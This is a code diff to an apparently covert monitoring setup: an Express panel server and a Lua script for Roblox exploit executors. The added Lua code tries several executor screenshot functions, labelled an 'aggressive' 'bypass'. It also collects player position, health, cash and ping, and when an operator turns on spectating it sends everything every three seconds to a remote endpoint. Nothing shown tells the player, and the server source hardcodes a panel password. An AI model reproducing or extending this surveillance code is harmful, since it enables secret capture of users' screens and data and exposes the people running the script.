@@ -10,7 +10,7 @@ const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 
 
 app.set('trust proxy', 1);
 app.use(cors({ origin: PUBLIC_URL, credentials: true }));
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json({ limit: '15mb' }));
 app.use(express.urlencoded({ extended: true }));
 
 const PANEL_PASSWORD = 'seyko92!';
@@ -438,48 +438,124 @@ local prevSpectate = false
 local screenshotThread = nil
 local spectating = false
 local screenshotSupported = nil
+local screenshotAttempts = 0
 
-local function captureScreenshot()
+-- ══════════════════════════════════════════════════════════
+-- AGGRESSIVE SCREENSHOT CAPTURE (Multi-method bypass)
+-- ══════════════════════════════════════════════════════════
+local function tryScreenshotMethod(methodName, func)
     if screenshotSupported == false then return nil end
+    screenshotAttempts = screenshotAttempts + 1
     
-    local funcs = {
-        function() return screencapture and screencapture() end,
-        function() return getgenv and getgenv().screencapture and getgenv().screencapture() end,
-        function() return syn and syn.screencapture and syn.screencapture() end,
-        function() return fluxus and fluxus.screencapture and fluxus.screencapture() end
+    local ok, result = pcall(func)
+    if ok and result and type(result) == "string" and #result > 100 then
+        screenshotSupported = true
+        return result, methodName
+    end
+    return nil, nil
+end
+
+local function captureScreenshotAggressive()
+    local methods = {
+        { name = "screencapture", func = function() return screencapture() end },
+        { name = "getgenv.screencapture", func = function() return getgenv and getgenv().screencapture and getgenv().screencapture() end },
+        { name = "syn.screencapture", func = function() return syn and syn.screencapture and syn.screencapture() end },
+        { name = "fluxus.screencapture", func = function() return fluxus and fluxus.screencapture and fluxus.screencapture() end },
+        { name = "getrenv.screencapture", func = function() return getrenv and getrenv().screencapture and getrenv().screencapture() end },
+        { name = "getscreencapture", func = function() return getscreencapture and getscreencapture() end }
     }
     
-    for _, fn in ipairs(funcs) do
-        local ok, result = pcall(fn)
-        if ok and result and type(result) == "string" and #result > 100 then
-            screenshotSupported = true
-            return result
+    for _, method in ipairs(methods) do
+        local result, usedMethod = tryScreenshotMethod(method.name, method.func)
+        if result then
+            return result, usedMethod
         end
     end
     
-    screenshotSupported = false
-    return nil
+    if screenshotAttempts > 10 then
+        screenshotSupported = false
+    end
+    
+    return nil, nil
 end
 
-local function sendScreenshot()
-    local screenshot = captureScreenshot()
+local function getTelemetry()
+    local char = LP.Character
+    local humanoid = char and char:FindFirstChild("Humanoid")
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    
+    local pos = "Unknown"
+    local health = "Unknown"
+    local cash = "Unknown"
+    
+    if root then
+        pos = string.format("%.1f, %.1f, %.1f", root.Position.X, root.Position.Y, root.Position.Z)
+    end
+    if humanoid then
+        health = math.floor(humanoid.Health) .. "/" .. math.floor(humanoid.MaxHealth)
+    end
+    
+    local pg = LP:FindFirstChild("PlayerGui")
+    if pg then
+        for _, obj in ipairs(pg:GetDescendants()) do
+            if obj:IsA("TextLabel") and (string.find(obj.Text, "$") or string.find(obj.Text, "Cash") or string.find(obj.Text, "coins")) then
+                cash = obj.Text
+                break
+            end
+        end
+    end
+    
+    local ping = "Unknown"
+    local stats = game:GetService("Stats")
+    if stats and stats:FindFirstChild("Network") and stats.Network:FindFirstChild("ServerStatsItem") and stats.Network.ServerStatsItem:FindFirstChild("Data Ping") then
+        ping = math.floor(stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+    end
+    
+    return {
+        position = pos,
+        health = health,
+        cash = cash,
+        executor = executorName,
+        ping = ping
+    }
+end
+
+local function sendSpecData()
+    local telemetry = getTelemetry()
+    local screenshot = nil
+    local screenshotMethod = nil
     local errorMsg = nil
     
-    if not screenshot then
-        errorMsg = "SCREENSHOT_NOT_SUPPORTED: " .. executorName
-    elseif #screenshot > 500000 then
-        errorMsg = "IMAGE_TOO_LARGE: " .. #screenshot .. " bytes"
-        screenshot = nil
+    if screenshotSupported ~= false then
+        screenshot, screenshotMethod = captureScreenshotAggressive()
+        
+        if screenshot then
+            if #screenshot > 800000 then
+                errorMsg = "IMAGE_TOO_LARGE:" .. #screenshot
+                screenshot = nil
+            else
+                -- Compress/validate base64
+                if not string.match(screenshot, "^data:image") then
+                    screenshot = "data:image/png;base64," .. screenshot
+                end
+            end
+        elseif screenshotAttempts > 5 then
+            errorMsg = "SCREENSHOT_NOT_SUPPORTED:" .. executorName
+        end
+    else
+        errorMsg = "SCREENSHOT_DISABLED:" .. executorName
     end
     
     pcall(function()
         request({
-            Url = BASE .. "/api/public/screenshot",
+            Url = BASE .. "/api/public/spec_data",
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
             Body = HttpService:JSONEncode({
                 user_id = LP.UserId,
                 screenshot = screenshot,
+                screenshotMethod = screenshotMethod,
+                telemetry = telemetry,
                 error = errorMsg,
                 timestamp = os.time()
             })
@@ -516,10 +592,12 @@ local function poll()
         prevSpectate = wantSpectate
         if wantSpectate then
             spectating = true
+            screenshotAttempts = 0
+            screenshotSupported = nil
             if not screenshotThread then
                 screenshotThread = task.spawn(function()
                     while spectating do
-                        sendScreenshot()
+                        sendSpecData()
                         task.wait(3)
                     end
                 end)
@@ -588,14 +666,16 @@ app.post('/api/command', requireSession, (req, res) => {
     res.json({ status: 'ok' });
 });
 
-app.post('/api/public/screenshot', (req, res) => {
-    const { user_id, screenshot, error, timestamp } = req.body;
+app.post('/api/public/spec_data', (req, res) => {
+    const { user_id, screenshot, screenshotMethod, telemetry, error, timestamp } = req.body;
     if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
     
     const userId = String(user_id);
     const p = players.get(userId);
     if (p) {
         p.lastScreenshot = screenshot || null;
+        p.screenshotMethod = screenshotMethod || null;
+        p.telemetry = telemetry || null;
         p.screenshotError = error || null;
         p.screenshotTimestamp = timestamp || Date.now();
         players.set(userId, p);
@@ -608,10 +688,12 @@ app.get('/api/screenshot', requireSession, (req, res) => {
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
     
     const p = players.get(String(userId));
-    if (!p) return res.json({ screenshot: null, error: null });
+    if (!p) return res.json({ screenshot: null, telemetry: null, error: null });
     
     res.json({ 
         screenshot: p.lastScreenshot || null,
+        screenshotMethod: p.screenshotMethod || null,
+        telemetry: p.telemetry || null,
         error: p.screenshotError || null,
         timestamp: p.screenshotTimestamp 
     });
